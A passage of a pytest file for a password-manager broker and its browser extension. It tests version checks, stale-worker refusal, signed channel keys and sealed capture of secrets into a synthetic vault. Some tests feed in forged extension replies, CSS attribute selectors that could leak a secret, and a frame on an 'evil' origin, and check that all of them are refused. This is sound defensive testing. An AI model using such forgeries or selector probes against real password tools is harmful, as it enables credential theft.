    assert broker.dispatch({**request, 'top_url': 'https://other.example.org/'}) == dict(ok=False, error=error)
    extension.tabs[8] = [Document('TOP', LOGIN)]
    assert broker.dispatch(request) == dict(ok=False, error=error)
    # Nowhere: the refusal names the fix.
    assert broker.dispatch({**request, 'top_url': 'https://missing.example.net/'}) == dict(ok=False, error=error)
    # A page ID of the refused browser: refused at once.
    calls = len(extension.calls)
    assert broker.dispatch({**request, 'page_id': channel.id + '.8'}) == dict(ok=False, error=route.STALE
                                                                             if refused != 'mismatch' else error)
    assert len(extension.calls) == calls


def test_the_frame_list_names_the_fix_of_the_refused_browser_that_has_the_page():
    broker = make_broker()
    mismatched, _ = paired(broker, {}, 'chrome', version=OTHER_BUILD)
    _, extension = paired(broker, {t: [Document('TOP', LOGIN)] for t in range(1, 6)}, 'edge')
    worker_says_stale(extension)  # Five tabs show the URL: more than one frame list may name.
    request = dict(action='list-password-frames', password_protocol=1, frame_protocol=1, top_url=LOGIN,
                   route='extension')
    assert broker.dispatch(request) == dict(ok=False, error=route.STALE)
    # Nowhere open: the first refusal.
    assert broker.dispatch({**request, 'top_url': 'https://missing.example.net/'}) == dict(
        ok=False, error=route.MISMATCH.format(loaded=OTHER_BUILD, expected=BUILT))
    assert mismatched.stale is False


def test_a_stale_frame_answer_without_a_valid_tab_count_is_refused():
    broker = make_broker()
    channel, extension = paired(broker, {3: [Document('TOP', LOGIN)]}, 'helium')
    request = dict(action='list-password-frames', password_protocol=1, frame_protocol=1, top_url=LOGIN,
                   route='extension')
    for reply in (dict(ok=False, error='stale'), dict(ok=False, error='stale', tabs=-1),
                  dict(ok=False, error='stale', tabs=True), dict(ok=False, error='stale', tabs=1, x=1)):
        channel.stale = False
        extension.handle = lambda op, payload, reply=reply: reply
        assert broker.dispatch(request) == dict(ok=False, error='frame list unavailable: page missing, ambiguous, '
                                                'changed or unsupported')


def test_a_worker_that_finds_a_newer_build_on_disk_refuses_and_shows_stale_from_then_on():
    broker = make_broker()
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    assert pin_password(broker, channel, 3, 'TOP', LOGIN)['ok'] is True
    handle = extension.handle
    extension.handle = lambda op, payload: (extension.calls.append(op) or dict(ok=False, error='stale')
                                            if op in {'frames', 'pin'} else handle(op, payload))
    assert pin_password(broker, channel, 3, 'TOP', LOGIN) == dict(ok=False, error=route.STALE)
    assert channel.stale is True
    assert broker.dispatch(dict(action='ping'))['extension_browsers'][0]['version_status'] == 'stale'
    calls = len(extension.calls)
    assert pin_password(broker, channel, 3, 'TOP', LOGIN) == dict(ok=False, error=route.STALE)
    assert len(extension.calls) == calls  # Refused by the broker: no call to the worker.


def test_host_forwards_a_stale_worker_and_refuses_any_other_stale_value(pair_of_sockets):
    broker_side, host_side = pair_of_sockets
    hello = frame(dict(type='hello', protocol=1, public_key=KEY, version=BUILT, stale=True))
    assert extension_host.relay(io.BytesIO(hello), io.BytesIO(), route.EXTENSION_ORIGIN, 'helium',
                                lambda: host_side) == 0
    assert receive_message(broker_side) == dict(action='extension-attach', extension_protocol=1,
                                                extension_id=route.EXTENSION_ID, browser='helium', public_key=KEY,
                                                extension_version=BUILT, extension_stale=True)
    for value in (False, 1, 'true', None):
        connected = []
        hello = frame(dict(type='hello', protocol=1, public_key=KEY, version=BUILT, stale=value))
        assert extension_host.relay(io.BytesIO(hello), io.BytesIO(), route.EXTENSION_ORIGIN, 'helium',
                                    lambda: connected.append(1)) == 1
        assert connected == []


@pytest.mark.parametrize('value', [False, 1, 'true', None])
def test_attach_refuses_any_stale_value_but_true(pair_of_sockets, value):
    broker_side, host_side = pair_of_sockets
    request = dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                   browser='helium', public_key=KEY, extension_version=BUILT, extension_stale=value)
    broker = make_broker()
    broker.extension.attach(broker_side, request)
    assert receive_message(host_side) == dict(type='error', error='extension attach refused')
    assert broker.extension.channels == {}


def test_host_forwards_a_valid_extension_version(pair_of_sockets):
    broker_side, host_side = pair_of_sockets
    hello = frame(dict(type='hello', protocol=1, public_key=KEY, version='0.1.0'))
    assert extension_host.relay(io.BytesIO(hello), io.BytesIO(), route.EXTENSION_ORIGIN, 'helium',
                                lambda: host_side) == 0
    assert receive_message(broker_side) == dict(action='extension-attach', extension_protocol=1,
                                                extension_id=route.EXTENSION_ID, browser='helium', public_key=KEY,
                                                extension_version='0.1.0')


@pytest.mark.parametrize('version', ['1.0', '1.0.0.0.0', '1.0.0.01', '01.0.0', '1.0.0-beta', ' 1.0.0', '1.0.0\n', '123456.0.0',
                                     1, None, ['1.0.0'], '١.٠.٠'])
def test_host_refuses_a_malformed_extension_version(version):
    connected = []
    hello = frame(dict(type='hello', protocol=1, public_key=KEY, version=version))
    out = io.BytesIO()
    assert extension_host.relay(io.BytesIO(hello), out, route.EXTENSION_ORIGIN, 'helium',
                                lambda: connected.append(1)) == 1
    assert connected == [] and out.getvalue() == b''


def test_extension_version_check_is_strict():
    assert route.valid_extension_version('1.2.3') and route.valid_extension_version('99999.0.0')
    assert route.valid_extension_version('1.2.3.4') and route.valid_extension_version('99999.99999.99999.99999')
    for bad in ('1.2', '1.2.3.4.5', '1.2.3.04', '01.2.3', '1.2.3 ', '1.2.3\n', '99999.99999.999999', '1.2.3.',
                '1.2.3.123456', 1, True, None, '١.٢.٣', ''):
        assert not route.valid_extension_version(bad)


@pytest.mark.parametrize('version', ['1.0', 'x', 7, None, '1.0.0' * 10])
def test_attach_refuses_a_malformed_extension_version(pair_of_sockets, version):
    broker_side, host_side = pair_of_sockets
    request = dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                   browser='helium', public_key=KEY, extension_version=version)
    broker = make_broker()
    broker.extension.attach(broker_side, request)
    assert receive_message(host_side) == dict(type='error', error='extension attach refused')
    assert broker.extension.channels == {}


@pytest.mark.parametrize('extra, version, version_status', [
    (dict(extension_version=BUILT), BUILT, 'current'),
    (dict(extension_version='0.0.9'), '0.0.9', 'outdated'),
    (dict(extension_version='0.0.9.7'), '0.0.9.7', 'outdated'),
    (dict(extension_version='999.0.0'), '999.0.0', 'newer'),
    # The same MAJOR.MINOR.PATCH with other contents, or from a build without the fourth part:
    # the browser loads another build than this broker's.
    (dict(extension_version=OTHER_BUILD), OTHER_BUILD, 'mismatch'),
    (dict(extension_version=route.EXTENSION_VERSION), route.EXTENSION_VERSION, 'mismatch'),
    # The worker found a newer build on disk and could not reload into it.
    (dict(extension_version=BUILT, extension_stale=True), BUILT, 'stale'),
    # An extension built by akdbx 0.21.2 or earlier sends no version: it attaches and shows as outdated.
    ({}, None, 'outdated'),
])
def test_status_shows_each_loaded_extension_version(pair_of_sockets, extra, version, version_status):
    broker_side, host_side = pair_of_sockets
    broker = make_broker()
    request = dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                   browser='helium', public_key=KEY, **extra)
    worker = threading.Thread(target=broker.extension.attach, args=(broker_side, request), daemon=True)
    worker.start()
    assert receive_message(host_side)['type'] == 'attached'
    status = broker.dispatch(dict(action='ping'))
    assert status['extension_version_expected'] == BUILT and status['extension_connected'] is True
    assert status['extension_browsers'] == [dict(browser='helium', paired=False, version=version,
                                                 version_status=version_status)]
    host_side.close()
    worker.join(5)
    assert broker.extension.channels == {}


def test_status_lists_the_expected_extension_version_without_a_connection():
    status = make_broker().dispatch(dict(action='ping'))
    assert status['extension_version_expected'] == BUILT and status['extension_browsers'] == []


# ----- secret capture -----------------------------------------------------------------
SECRET = 'sk_synthetic_ONLY_0123456789abcdef'
SECRET_SITE = 'https://dashboard.example.com/keys'


def read_pin(broker, channel, tab, document, top, **extra):
    request = dict(action='pin-password-target', password_protocol=1, page_id=f'{channel.id}.{tab}',
                   frame_id=document, top_url=top, selector='#secret', mode='read', capture_protocol=1,
                   route='extension')
    request.update(extra)
    return broker.dispatch(request)


def capture(broker, target, **extra):
    request = dict(action='capture-secret', capture_protocol=1, target=target, field='client_secret', create=True,
                   metadata=dict(title='Synthetic API', username='synthetic-key', url=SECRET_SITE, group='Web'),
                   start_deadline=broker.clock() + 4)
    request.update(extra)
    return broker.dispatch(request)


MASTER = 'synthetic-capture-master-only'


@pytest.fixture(scope='module')
def template(tmp_path_factory):
    """A synthetic KDBX with a cheap KDF and a 'Web' group; never a real vault."""
    from pykeepass import create_database
    path = tmp_path_factory.mktemp('capture-template') / 'synthetic.kdbx'
    vault = create_database(io.BytesIO(), password=MASTER)
    params = vault.kdbx.header.value.dynamic_header.kdf_parameters.data.dict
    params['I'].value, params['M'].value = 1, 1024 * 1024
    vault.add_group(vault.root_group, 'Web')
    buffer = io.BytesIO()
    vault.save(buffer)
    path.write_bytes(buffer.getvalue())
    return path


def saved_secret(broker):
    """What the saved file holds, read back with its own master password."""
    from pykeepass import PyKeePass
    entry = PyKeePass(str(broker.capture_path), password=MASTER).find_entries(title='Synthetic API', first=True)
    return None if entry is None else entry.get_custom_property('client_secret')


@pytest.fixture
def capture_broker(tmp_path, template):
    import shutil
    from akdbx.broker import open_vault_with_password
    path = tmp_path / 'synthetic.kdbx'
    shutil.copyfile(template, path)
    broker = Broker(open_vault_with_password(path, MASTER), RecordingTyper())
    broker.writes.public_base = 'https://unlock.example.test:9443'
    broker.capture_path = path
    return broker


def test_status_advertises_extension_secret_capture():
    status = make_broker().dispatch(dict(action='ping'))
    assert status['extension_capture_protocol'] == 1
    assert status['extension_capture_delivery'] == route.CAPTURE_DELIVERY == 'extension-dom-read-v1'


def test_extension_read_pin_captures_through_both_sealed_directions(capture_broker):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    extension.secret = SECRET
    pin = read_pin(broker, channel, 4, 'TOP', SECRET_SITE)
    assert pin == dict(ok=True, target=pin['target'], expires_in=30, target_delivery=route.DELIVERY)
    receipt = capture(broker, pin['target'])
    assert receipt['ok'] and receipt['capture_delivery'] == route.CAPTURE_DELIVERY, receipt
    assert receipt['length'] == len(SECRET) and SECRET not in json.dumps(receipt)
    assert saved_secret(broker) == SECRET
    assert extension.calls.count('read') == 1 and 'release' in extension.calls


def test_a_read_pin_never_fills_and_a_fill_pin_never_reads(capture_broker):
    broker = capture_broker
    broker.vault.add_entry(broker.vault.root_group, 'Synthetic login', USERNAME, PASSWORD, url=SECRET_SITE)
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    extension.secret = SECRET
    pin = read_pin(broker, channel, 4, 'TOP', SECRET_SITE)
    handle = search(broker, 'dashboard.example.com')
    assert broker.dispatch(dict(action='fill', handle=handle, mode='password', target=pin['target'],
                                target_protocol=1))['ok'] is False
    assert extension.filled == []
    fill_pin = pin_password(broker, channel, 4, 'TOP', SECRET_SITE)
    assert fill_pin['ok']
    assert capture(broker, fill_pin['target'])['ok'] is False and saved_secret(broker) is None


@pytest.mark.parametrize('forgery', ['other key', 'other pin', 'other facts', 'plain value', 'extra field'])
def test_a_relayed_read_reply_that_the_extension_did_not_seal_saves_nothing(capture_broker, forgery):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    other_private, other_public = new_key()

    def reply(payload):
        bound = dict(tab_id=payload['tab_id'], document_id=payload['document_id'], chain=payload['chain'],
                     pin_id=payload['pin_id'])
        key, raw, context = EXTENSION_PRIVATE, EXTENSION_PUBLIC, 'capture:' + payload['pin_id']
        if forgery == 'other key':
            key, raw = other_private, other_public
        elif forgery == 'other pin':
            context = 'capture:' + 'f' * 32
        elif forgery == 'other facts':
            bound = dict(bound, document_id='ELSEWHERE')
        elif forgery == 'plain value':
            return dict(state='read', sealed=dict(iv='A' * 16, data='B' * 40), value=SECRET)
        sealed = seal_capture(key, raw, channel.broker_public_key, SECRET, bound, context)
        return dict(state='read', sealed=sealed, **({'extra': 1} if forgery == 'extra field' else {}))
    extension.read_reply = reply
    pin = read_pin(broker, channel, 4, 'TOP', SECRET_SITE)
    receipt = capture(broker, pin['target'])
    assert receipt['ok'] is False and SECRET not in json.dumps(receipt)
    assert saved_secret(broker) is None


def test_a_broker_sealed_value_cannot_pass_as_a_capture():
    """The two directions use different keys: a fill payload replayed as a capture fails authentication."""
    broker = make_broker()
    channel, _ = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    sealed = channel.seal(dict(value=SECRET, facts={}), 'capture:' + 'a' * 32)
    assert channel.open(sealed, 'capture:' + 'a' * 32) is None


def test_extension_read_pins_follow_the_cdp_read_rules(capture_broker):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE),
                                             Document('SAME', 'https://keys.example.com/frame', 'TOP'),
                                             Document('EVIL', 'https://evil.example.net/frame', 'TOP')]})
    extension.secret = SECRET
    # Attribute and functional selectors could test the secret: refused before the browser sees them.
    for selector in ('input[value^="s"]', '#secret:not(:empty)', 'code:has(b)'):
        assert read_pin(broker, channel, 4, 'TOP', SECRET_SITE, selector=selector) == failure()
    assert 'pin' not in extension.calls
    # Fill-only options are not read options.
    assert read_pin(broker, channel, 4, 'TOP', SECRET_SITE, password_purpose='new-password') == failure()
    assert read_pin(broker, channel, 4, 'TOP', SECRET_SITE, capture_protocol=2) == failure()
    # The extension reads only in the top document: any frame route is refused before the browser sees it.
    for frame, origin in (('SAME', 'https://keys.example.com'), ('EVIL', 'https://evil.example.net')):
        assert read_pin(broker, channel, 4, frame, SECRET_SITE, frame_protocol=1, frame_origin=origin) == failure()
    assert 'pin' not in extension.calls
    # A child frame named without a frame route is refused from its browser chain, and released.
    assert read_pin(broker, channel, 4, 'SAME', SECRET_SITE) == failure()
    assert extension.calls == ['pin', 'release']


def test_capture_refuses_a_page_off_the_record_origin(capture_broker):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', 'https://keys.example.com/new')]})
    extension.secret = SECRET
    pin = read_pin(broker, channel, 4, 'TOP', 'https://keys.example.com/new')
    assert pin['ok'], pin
    assert capture(broker, pin['target'])['ok'] is False  # The record's URL is dashboard.example.com.
    assert 'read' not in extension.calls and saved_secret(broker) is None


@pytest.mark.parametrize('value', ['', 'two words', 'line\nbreak', 'x' * 4097])
def test_capture_refuses_an_invalid_read_value(capture_broker, value):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    extension.secret = value
    pin = read_pin(broker, channel, 4, 'TOP', SECRET_SITE)
    assert capture(broker, pin['target'])['ok'] is False and saved_secret(broker) is None


def test_an_older_extension_gets_no_read_or_child_frame_login_pins_but_keeps_the_rest(capture_broker):
    broker = capture_broker
    extension = FakeExtension({4: [Document('TOP', SECRET_SITE), Document('SAME', 'https://keys.example.com/f', 'TOP')]})
    channel = FakeChannel(broker.extension, extension, version='0.3.0')
    broker.extension.channels[channel.id] = channel
    broker.extension.approved.append(channel.digest)
    assert read_pin(broker, channel, 4, 'TOP', SECRET_SITE) == failure()
    assert pin_password(broker, channel, 4, 'SAME', SECRET_SITE, frame_protocol=1,
                        frame_origin='https://keys.example.com') == failure()
    assert 'pin' not in extension.calls
    # Main-frame logins and cards keep working with the older extension.
    assert pin_password(broker, channel, 4, 'TOP', SECRET_SITE)['ok']
    card = broker.dispatch(dict(action='pin-card-target', card_protocol=1, page_id=f'{channel.id}.4', frame_id='TOP',
                                top_url=SECRET_SITE, selector='#number', field='cc-number', route='extension'))
    assert card['ok'], card


def test_cli_reads_through_the_extension_with_route_or_default(monkeypatch, capsys, capture_broker):
    broker = capture_broker
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    extension.secret = SECRET
    base = ['pin-password-target', '--page-id', f'{channel.id}.4', '--frame-id', 'TOP', '--top-url', SECRET_SITE,
            '--selector', '#secret', '--mode', 'read']
    status, pin, _ = run_cli(monkeypatch, capsys, broker, [*base, '--route', 'extension'])
    assert status == 0 and pin['target_delivery'] == route.DELIVERY, pin
    status, receipt, _ = run_cli(monkeypatch, capsys, broker, [
        'capture-secret', '--target', pin['target'], '--field', 'client_secret', '--new', '--title', 'Synthetic API',
        '--username', 'synthetic-key', '--url', SECRET_SITE, '--group', 'Web'])
    assert status == 0 and receipt['capture_delivery'] == route.CAPTURE_DELIVERY and saved_secret(broker) == SECRET
    # With the extension as the default route, a read pin takes it without --route.
    broker.extension.default_route = 'extension'
    status, pin, _ = run_cli(monkeypatch, capsys, broker, base)
    assert status == 0 and pin['target_delivery'] == route.DELIVERY, pin


def test_cli_keeps_read_pins_on_cdp_for_a_broker_without_extension_capture(monkeypatch, capsys):
    from akdbx import cli
    args = SimpleNamespace(route=None)
    old = dict(default_fill_route='extension')
    assert cli._read_route(args, old) == 'cdp'
    assert cli._read_route(args, dict(old, extension_capture_protocol=1,
                                      extension_capture_delivery='extension-dom-read-v1')) == 'extension'
    assert cli._read_route(SimpleNamespace(route='cdp'), dict(old, extension_capture_protocol=1,
                                                              extension_capture_delivery='extension-dom-read-v1')) == 'cdp'
    new = dict(old, extension_capture_protocol=1, extension_capture_delivery='extension-dom-read-v1')
    assert cli._read_route(SimpleNamespace(route=None, frame_origin='https://keys.example.com'), new) == 'cdp'
    broker = make_broker()
    real = broker.dispatch

    def older(request):
        result = real(request)
        if request.get('action') == 'ping':
            result.pop('extension_capture_protocol')
        return result
    broker.dispatch = older
    channel, _ = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    status, refused, _ = run_cli(monkeypatch, capsys, broker, [
        'pin-password-target', '--page-id', f'{channel.id}.4', '--frame-id', 'TOP', '--top-url', SECRET_SITE,
        '--selector', '#secret', '--mode', 'read', '--route', 'extension'])
    assert status == 1 and 'extension secret capture' in refused['error']


def test_state_messages_sign_the_connection_keys_with_the_broker_identity(tmp_path):
    """The host relays the broker's per-connection key; only the identity signature shows the broker made it."""
    import base64
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
    from akdbx import broker_identity
    broker = make_broker()
    identity = broker_identity.IdentityStore(tmp_path / 'identity').announce('https://localhost:9443')
    broker.extension.set_identity(identity)
    channel, _ = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    message = broker.extension._state(channel, 'attached')
    statement = dict(type='akdbx-channel', v=1, key_id=identity.key_id, broker_key=route.b64url(channel.broker_public_key),
                     extension_key=KEY)
    raw = base64.urlsafe_b64decode(message['channel_signature'] + '==')
    point = base64.urlsafe_b64decode(identity.public_key + '=')
    key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), point)
    key.verify(encode_dss_signature(int.from_bytes(raw[:32], 'big'), int.from_bytes(raw[32:], 'big')),
               broker_identity.canonical_bytes(statement), ec.ECDSA(hashes.SHA256()))
    # Another connection key gets another signature: a host cannot reuse one for its own key.
    other, _ = attach(broker, {5: [Document('TOP', SECRET_SITE)]})
    assert broker.extension._state(other, 'attached')['channel_signature'] != message['channel_signature']


def test_a_version_the_extension_did_not_report_breaks_every_sealed_value():
    """From 0.4.0 the keys bind the reported version: an older extension behind a host that claims 0.4.0 opens nothing."""
    from cryptography.exceptions import InvalidTag
    broker = make_broker()
    channel, _ = attach(broker, {4: [Document('TOP', SECRET_SITE)]})
    sealed = channel.seal(dict(values={}, facts={}), 'fill:' + 'a' * 32)
    assert unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, sealed, 'fill:' + 'a' * 32)
    global BOUND
    bound, BOUND = BOUND, b''  # What extension 0.3.0 derives.
    try:
        with pytest.raises(InvalidTag):
            unseal(EXTENSION_PRIVATE, EXTENSION_PUBLIC, channel.broker_public_key, sealed, 'fill:' + 'a' * 32)
    finally:
        BOUND = bound



def test_a_child_frame_read_pin_without_a_route_takes_cdp_when_the_extension_is_the_default():
    broker = make_broker()
    broker.extension.default_route = 'extension'
    channel, extension = attach(broker, {4: [Document('TOP', SECRET_SITE), Document('SAME', 'https://keys.example.com/f', 'TOP')]})
    calls = []
    broker.passwords.pin = lambda request: calls.append(request) or dict(ok=True, target='c' * 64, expires_in=30,
                                                                       target_delivery='chromium-password-dom-v1')
    request = dict(action='pin-password-target', password_protocol=1, page_id='CDP-PAGE', frame_id='SAME', top_url=SECRET_SITE,
                   selector='#secret', mode='read', capture_protocol=1, frame_protocol=1, frame_origin='https://keys.example.com')
    assert broker.dispatch(request)['ok'] and len(calls) == 1 and 'pin' not in extension.calls
